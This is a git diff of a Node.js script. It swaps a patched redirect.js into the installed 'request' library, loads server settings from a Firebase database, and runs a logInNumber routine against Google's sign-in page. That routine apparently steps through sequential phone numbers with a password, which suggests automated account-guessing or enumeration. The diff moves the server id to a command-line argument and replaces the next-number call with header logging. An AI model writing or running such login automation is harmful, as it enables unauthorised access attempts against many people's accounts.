@@ -24,16 +24,16 @@ let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmy
 
 fs.copyFile('redirect.js', 'node_modules/request/lib/redirect.js', (err) => {
     if(!err) {
-        fs.readFile('./id.txt', {encoding: 'utf-8'}, function(err,data){
-            if(!err) {
-                SERVER = 'server'+data
+        process.argv.slice(2).forEach(function (val, index) {
+            if (index === 0) {
+                SERVER = 'server'+val
                 database.connect((error) => {
                     if(!error) {
                         request({
                             url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
                             json:true
                         }, function(error, response, body){
-                            if(!error) {
+                            if(!(error || body == null)) {
                                 CODE = body['code']
                                 COUNTRY = body['name']
                                 mServerData = body
@@ -195,7 +195,8 @@ async function logInNumber(number, password, name, start, runing) {
             } catch (e) {}
             
             if(!check) {
-                checkNumber(number+1, name, start, runing)
+                console.log(response.headers)
+                //checkNumber(number+1, name, start, runing)
             }
         })
     } else {
